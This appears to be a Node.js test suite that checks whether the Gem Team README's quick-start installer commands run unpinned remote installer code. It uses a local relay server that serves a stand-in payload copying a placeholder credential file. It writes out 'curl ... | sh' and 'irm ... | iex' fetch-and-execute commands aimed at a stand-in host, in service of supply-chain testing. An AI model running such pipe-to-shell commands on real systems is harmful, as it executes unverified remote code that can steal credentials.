// Spec for the Gem Team quick start installer.
// Run: node --test eng/gem-team-installer.test.mjs
//
// The Windows case needs PowerShell 7. Set PWSH to the pwsh binary, or leave
// pwsh on PATH. These tests fail while the quick start executes an installer
// body it did not pin with a checksum.
//
// Scope is the Quick Start installer in plugins/gem-team/README.md (the macOS
// / Linux command and the Windows PowerShell command). Other documents that
// pipe a different remote installer are not this plugin's quick start:
// website/data/tools.yml, skills/aspire/, agents/droid.agent.md,
// cookbook/copilot-sdk/java/recipe/README.md,
// website/src/content/docs/learning-hub/cli-for-beginners/00-quick-start.md,
// and skills/nano-banana-pro-openrouter/SKILL.md.

import assert from "node:assert/strict";
import { spawn, execFileSync } from "node:child_process";
import { createHash, randomBytes } from "node:crypto";
import { createServer } from "node:http";
import {
  chmodSync,
  existsSync,
  mkdtempSync,
  readFileSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const readmePath = path.join(repoRoot, "plugins/gem-team/README.md");
const CREDENTIAL_NAME = "credential-placeholder";
const CREDENTIAL_VALUE = "PLACEHOLDER_NOT_A_SECRET\n";
const MARKER = "marker-executed";
const LOOT = "loot-from-installer";
const UNIX_URL = "https://aka.ms/apm-unix";
const WINDOWS_URL = "https://aka.ms/apm-windows";

function quickStart(markdown) {
  const start = markdown.indexOf("## Quick Start");
  assert.ok(start >= 0, "Gem Team README has a Quick Start section");
  const rest = markdown.slice(start);
  const next = rest.indexOf("\n## ", 1);
  return next < 0 ? rest : rest.slice(0, next);
}

function fencedBlocks(section) {
  const blocks = [];
  const re = /```([^\n]*)\n([\s\S]*?)```/g;
  let match = re.exec(section);
  while (match) {
    blocks.push({ info: match[1].trim(), body: match[2] });
    match = re.exec(section);
  }
  return blocks;
}

function isInstallerBlock(body) {
  return /\b(curl|wget|irm|iwr|Invoke-RestMethod|Invoke-WebRequest|Invoke-Expression|iex|sha256sum|shasum|Get-FileHash)\b|https?:\/\//.test(body);
}

function pinnedDigests(section) {
  return new Set([...section.matchAll(/\b[a-fA-F0-9]{64}\b/g)].map((match) => match[0].toLowerCase()));
}

function windowsLines(body) {
  const lines = [];
  let mode = "posix";
  for (const line of body.split(/\r?\n/)) {
    const trimmed = line.trim();
    if (trimmed.startsWith("#")) {
      const comment = trimmed.replace(/^#+\s*/, "");
      if (/^(windows|powershell)\b/i.test(comment)) mode = "windows";
      else if (/^(mac|linux|unix)\b/i.test(comment)) mode = "posix";
      // Only the "# Verify" section header drops the following apm check.
      // A comment that mentions verification still leaves later installer
      // commands in the script under test.
      else if (/^verify$/i.test(comment)) mode = "verify";
      continue;
    }
    if (!trimmed) continue;
    const powershell = /\b(irm|iwr|iex|Invoke-Expression|Invoke-RestMethod|Invoke-WebRequest|Get-FileHash)\b/.test(trimmed);
    if (powershell) {
      lines.push(trimmed);
      continue;
    }
    if (mode === "verify") continue;
    if (mode === "windows") lines.push(trimmed);
  }
  return lines;
}

function sameHttpUrl(value, expected) {
  let actual;
  let target;
  try {
    actual = new URL(value);
    target = new URL(expected);
  } catch {
    return false;
  }
  return actual.protocol === target.protocol
    && actual.hostname === target.hostname
    && actual.port === target.port
    && actual.pathname === target.pathname;
}

function textHasUrl(text, expected) {
  return [...text.matchAll(/https?:\/\/[^\s'")<>]+/g)].some((match) => {
    const candidate = match[0].replace(/[),.;]+$/g, "");
    return sameHttpUrl(candidate, expected);
  });
}

function rewriteUrls(command, port) {
  return command.replace(/(['"])(https?:\/\/[^'"]+)\1|https?:\/\/[^\s'"\\]+/g, (match, quote, quotedUrl) => {
    const url = quotedUrl || match;
    const relay = new URL(`http://127.0.0.1:${port}/relay`);
    relay.searchParams.set("url", url);
    const relayText = relay.toString();
    if (quote) return `${quote}${relayText}${quote}`;
    return `'${relayText}'`;
  });
}

function findPwsh() {
  const candidates = [process.env.PWSH, "/tmp/pwsh/pwsh"];
  for (const candidate of candidates) {
    if (candidate && existsSync(candidate)) return candidate;
  }
  try {
    const found = execFileSync("/usr/bin/bash", ["-lc", "command -v pwsh"], {
      encoding: "utf8",
    }).trim();
    return found || null;
  } catch {
    return null;
  }
}

function isChecksumUrl(value) {
  return /sha(256|512)|checksum|shasum|sums|digest/i.test(value);
}

function readOutputNames(stateDir) {
  const file = path.join(stateDir, "outputs");
  if (!existsSync(file)) return [];
  return readFileSync(file, "utf8").split("\n").map((line) => line.trim()).filter(Boolean);
}

function startServer() {
  const requests = [];
  const bodies = new Map();
  const stateDir = mkdtempSync(path.join(tmpdir(), "gem-team-state-"));
  let generation = 0;
  let pending = null;

  function freshBody() {
    generation += 1;
    const token = `${generation}-${randomBytes(8).toString("hex")}`;
    // cp, echo, and > run in dash and in PowerShell 7. A later response is a
    // different script, so a checksum of an earlier download does not cover it.
    const script = `cp ${CREDENTIAL_NAME} ${LOOT}\necho ${token} > ${MARKER}\n`;
    const sha256 = createHash("sha256").update(script).digest("hex");
    const body = { token, sha256, script };
    bodies.set(token, body);
    return body;
  }

  const server = createServer((req, res) => {
    const url = new URL(req.url, "http://127.0.0.1");
    if (url.pathname === "/relay") {
      const original = url.searchParams.get("url") || "";
      requests.push(original);
      const kind = isChecksumUrl(original) ? "sum" : "body";
      res.writeHead(302, { Location: `/payload?kind=${kind}` });
      res.end();
      return;
    }

    const kind = url.searchParams.get("kind") === "sum" ? "sum" : "body";
    if (kind === "sum") {
      // The digest describes the next body this server will send, not a body
      // already served to the harness. A checksum-then-download of one
      // generation therefore matches, and a control download cannot supply it.
      const target = pending ||= freshBody();
      const names = new Set();
      for (const name of readOutputNames(stateDir)) {
        if (isChecksumUrl(name)) continue;
        names.add(name);
        names.add(path.basename(name));
      }
      const lines = [];
      for (const name of names) lines.push(`${target.sha256}  ${name}`);
      if (lines.length === 0) lines.push(target.sha256);
      const text = `${lines.join("\n")}\n`;
      res.writeHead(200, {
        "Content-Type": "text/plain; charset=utf-8",
        "Content-Length": Buffer.byteLength(text),
      });
      res.end(text);
      return;
    }

    const body = pending || freshBody();
    pending = null;
    res.writeHead(200, {
      "Content-Type": "text/plain; charset=utf-8",
      "Content-Length": Buffer.byteLength(body.script),
    });
    res.end(body.script);
  });

  return new Promise((resolve) => {
    server.listen(0, "127.0.0.1", () => {
      const { port } = server.address();
      const bin = mkdtempSync(path.join(tmpdir(), "gem-team-bin-"));
      const wrapper = `#!/usr/bin/python3
import os, sys, urllib.parse
port = ${port}
state = os.environ.get("GEM_TEAM_INSTALLER_STATE", "")
real_name = os.path.basename(sys.argv[0])
real = "/usr/bin/" + real_name
args = []
prefix = f"http://127.0.0.1:{port}/"
incoming = sys.argv[1:]
index = 0
while index < len(incoming):
    arg = incoming[index]
    output = None
    if arg in ("-o", "--output", "-O") and index + 1 < len(incoming):
        output = incoming[index + 1]
    elif arg.startswith("--output="):
        output = arg.split("=", 1)[1]
    if output and state:
        with open(os.path.join(state, "outputs"), "a", encoding="utf-8") as handle:
            handle.write(output + "\\n")
    if (arg.startswith("http://") or arg.startswith("https://")) and not arg.startswith(prefix):
        query = urllib.parse.urlencode({"url": arg})
        arg = f"http://127.0.0.1:{port}/relay?{query}"
    args.append(arg)
    index += 1
os.execv(real, [real, *args])
`;
      writeFileSync(path.join(bin, "curl"), wrapper, { mode: 0o755 });
      writeFileSync(path.join(bin, "wget"), wrapper, { mode: 0o755 });
      chmodSync(path.join(bin, "curl"), 0o755);
      chmodSync(path.join(bin, "wget"), 0o755);
      resolve({
        port,
        requests,
        bodies,
        bin,
        stateDir,
        close: () => new Promise((done) => server.close(() => done())),
      });
    });
  });
}

function makeWorkspace() {
  const dir = mkdtempSync(path.join(tmpdir(), "gem-team-ws-"));
  writeFileSync(path.join(dir, CREDENTIAL_NAME), CREDENTIAL_VALUE, { mode: 0o600 });
  chmodSync(path.join(dir, CREDENTIAL_NAME), 0o600);
  return dir;
}

function readOutcome(dir) {
  const markerPath = path.join(dir, MARKER);
  const lootPath = path.join(dir, LOOT);
  return {
    marker: existsSync(markerPath) ? readFileSync(markerPath) : null,
    loot: existsSync(lootPath) ? readFileSync(lootPath) : null,
    credential: readFileSync(path.join(dir, CREDENTIAL_NAME)),
  };
}

function runProcess(binary, args, cwd, env) {
  return new Promise((resolve, reject) => {
    const child = spawn(binary, args, {
      cwd,
      env,
      stdio: ["ignore", "pipe", "pipe"],
    });
    let stderr = "";
    const timer = setTimeout(() => {
      child.kill("SIGKILL");
      reject(new Error(`timed out running ${binary} ${args.join(" ")}\n${stderr}`));
    }, 15000);
    child.stderr.on("data", (chunk) => {
      stderr += chunk;
    });
    child.on("error", (error) => {
      clearTimeout(timer);
      reject(error);
    });
    child.on("close", (code) => {
      clearTimeout(timer);
      resolve({ code, stderr, outcome: readOutcome(cwd) });
    });
  });
}

function baseEnv(server) {
  return {
    PATH: `${server.bin}:/usr/bin:/bin`,
    HOME: tmpdir(),
    LANG: "C",
    GEM_TEAM_INSTALLER_STATE: server.stateDir,
  };
}

function executedUnpinned(outcome, bodies, pins) {
  if (outcome.loot === null && outcome.marker === null) return false;
  const token = outcome.marker ? outcome.marker.toString("utf8").trim() : "";
  const body = bodies.get(token);
  if (body && pins.has(body.sha256)) return false;
  return true;
}

function assertNotExecuted(outcome, bodies, pins, label) {
  assert.equal(
    executedUnpinned(outcome, bodies, pins),
    false,
    `${label} executed an installer body whose SHA-256 is not pinned in the quick start ` +
      `(marker=${outcome.marker ? outcome.marker.toString("utf8").trim() : "absent"}, ` +
      `copied workspace file=${outcome.loot !== null})`,
  );
  assert.equal(
    outcome.credential.toString("utf8"),
    CREDENTIAL_VALUE,
    `${label} changed the workspace file before refusing the installer`,
  );
}

test("gem team unix quick start does not execute a replaced APM installer", async () => {
  const section = quickStart(readFileSync(readmePath, "utf8"));
  const pins = pinnedDigests(section);
  const blocks = fencedBlocks(section).filter((block) => isInstallerBlock(block.body));
  assert.ok(blocks.length > 0, "Quick Start has an installer block");
  const server = await startServer();
  try {
    const env = baseEnv(server);
    const firstDir = makeWorkspace();
    const secondDir = makeWorkspace();
    const first = await runProcess("/usr/bin/bash", ["--noprofile", "--norc", "-c", `curl -sSL https://example.invalid/installer | sh`], firstDir, env);
    const second = await runProcess("/usr/bin/bash", ["--noprofile", "--norc", "-c", `curl -sSL https://example.invalid/installer | sh`], secondDir, env);
    assert.ok(first.outcome.loot && first.outcome.loot.equals(Buffer.from(CREDENTIAL_VALUE)), "harness did not run the first replaced installer under sh");
    assert.ok(second.outcome.marker, "harness did not run the second replaced installer under sh");
    assert.notEqual(
      first.outcome.marker.toString("hex"),
      second.outcome.marker.toString("hex"),
      "installer responses were identical, so a second fetch cannot be told apart from the checksummed one",
    );

    if (textHasUrl(section, UNIX_URL)) {
      assert.equal(blocks.some((block) => textHasUrl(block.body, UNIX_URL)), true);
    }
    for (const block of blocks) {
      const workspace = makeWorkspace();
      const result = await runProcess("/usr/bin/bash", ["--noprofile", "--norc", "-c", block.body], workspace, env);
      if (textHasUrl(block.body, UNIX_URL)) {
        assert.ok(
          server.requests.some((request) => sameHttpUrl(request, UNIX_URL)),
          "the quick start curl command did not request the APM unix installer URL",
        );
      }
      assertNotExecuted(result.outcome, server.bodies, pins, "macOS / Linux quick start");
    }
  } finally {
    await server.close();
  }
});

test("gem team windows quick start does not execute a replaced APM installer", async () => {
  const pwsh = findPwsh();
  assert.ok(pwsh, "PowerShell 7 (pwsh) is required to run the Windows quick start command");
  const section = quickStart(readFileSync(readmePath, "utf8"));
  const pins = pinnedDigests(section);
  const lines = fencedBlocks(section)
    .filter((block) => isInstallerBlock(block.body))
    .flatMap((block) => windowsLines(block.body));
  const server = await startServer();
  try {
    const env = { ...baseEnv(server), PWSH: pwsh };
    const control = `irm 'http://127.0.0.1:${server.port}/relay?url=${encodeURIComponent("https://example.invalid/win")}' | iex`;
    const firstDir = makeWorkspace();
    const secondDir = makeWorkspace();
    const first = await runProcess(pwsh, ["-NoProfile", "-NonInteractive", "-Command", control], firstDir, env);
    const second = await runProcess(pwsh, ["-NoProfile", "-NonInteractive", "-Command", control], secondDir, env);
    assert.equal(first.code, 0, `PowerShell harness failed: ${first.stderr}`);
    assert.ok(first.outcome.loot && first.outcome.loot.equals(Buffer.from(CREDENTIAL_VALUE)), "harness did not run the first replaced installer under Invoke-Expression");
    assert.ok(second.outcome.marker, "harness did not run the second replaced installer under Invoke-Expression");
    assert.notEqual(first.outcome.marker.toString("hex"), second.outcome.marker.toString("hex"));

    if (/\b(irm|iwr|Invoke-RestMethod|Invoke-WebRequest)\b[^\n]*\|\s*(iex|Invoke-Expression)\b/.test(section)) {
      assert.match(lines.join("\n"), /\b(irm|iwr|Invoke-RestMethod|Invoke-WebRequest)\b/);
    }
    if (lines.length === 0) return;

    const workspace = makeWorkspace();
    const script = rewriteUrls(lines.join("\n"), server.port);
    const result = await runProcess(pwsh, ["-NoProfile", "-NonInteractive", "-Command", script], workspace, env);
    if (lines.some((line) => textHasUrl(line, WINDOWS_URL))) {
      assert.ok(
        server.requests.some((request) => sameHttpUrl(request, WINDOWS_URL)),
        "the quick start did not request the APM windows installer URL",
      );
    }
    assertNotExecuted(result.outcome, server.bodies, pins, "Windows quick start");
  } finally {
    await server.close();
  }
});
